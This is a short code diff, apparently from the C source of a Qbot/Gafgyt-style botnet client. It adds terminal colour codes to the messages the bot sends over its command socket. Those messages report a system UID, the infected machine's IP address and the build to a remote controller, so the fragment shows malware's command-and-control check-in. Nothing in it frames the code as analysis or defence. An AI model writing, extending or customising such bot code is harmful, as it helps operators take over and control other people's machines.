@@ -1005,7 +1005,7 @@ int main(int argc, unsigned char *argv[])
         getOurIP();
         unsigned char uid[64];
               makeSystemUID(uid, sizeof(uid));
-              sockprintf(mainCommSock, "UID %s", uid);
+              sockprintf(mainCommSock, "\x1b[33mUID %s\x1b[0m", uid);
         if (pid1 = fork()) {
                         waitpid(pid1, &status, 0);
                         exit(0);
@@ -1027,7 +1027,7 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
 
-		sockprintf(mainCommSock, "[ CONNECTED ] IP: %s [ BUILD: %s", inet_ntoa(ourIP), getBuild());
+		sockprintf(mainCommSock, "\x1b[36m[ CONNECTED ] \x1b[34m IP: %s \x1b[35m[ BUILD: \x1b[34m%s\x1b[0m", inet_ntoa(ourIP), getBuild());
               
 
                 char commBuf[4096];
